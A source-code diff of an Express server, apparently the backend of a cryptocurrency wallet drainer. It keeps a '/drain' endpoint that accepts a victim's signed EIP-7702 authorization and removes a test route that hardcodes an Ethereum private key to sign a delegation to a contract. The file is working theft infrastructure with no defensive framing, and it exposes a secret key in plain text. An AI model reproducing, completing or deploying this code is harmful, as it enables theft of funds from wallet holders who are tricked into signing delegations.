@@ -16,33 +16,6 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
-app.get("/test", async (req, res) => {
-  try {
-    const FANTOME = "0xaa482A91eA4be0524c966c621FCA52F8Ade011C3";
-    const FANTOME_PK = "0x187aedafac6434ebd780acc1d6bd544055cb2bdb07c8dfb2c423f3d31c704d9f";
-
-    const fantomeAccount = privateKeyToAccount(FANTOME_PK);
-    const authNonce = Number(auth.nonce);
-
-    const authorization = await walletClient.signAuthorization({
-      account: fantomeAccount,
-      contractAddress: CONTRACT,
-      chainId: 1,
-      nonce: authNonce,
-    });
-
-    const hash = await walletClient.sendTransaction({
-      to: FANTOME,
-      data: "0x",
-      authorizationList: [authorization],
-    });
-
-    res.json({ hash });
-  } catch (e) {
-    res.status(500).json({ error: e.message || String(e) });
-  }
-});
-
 app.post("/drain", async (req, res) => {
   try {
     const { fantome, auth } = req.body;
@@ -54,7 +27,7 @@ app.post("/drain", async (req, res) => {
       return res.status(400).json({ error: "r ou s manquant dans auth" });
     }
 
-    const authNonce = await publicClient.getTransactionCount({ address: fantome });
+    const authNonce = Number(auth.nonce);
 
     let yp = auth.yParity;
     if (typeof yp === "string" && yp.startsWith("0x")) yp = parseInt(yp, 16);
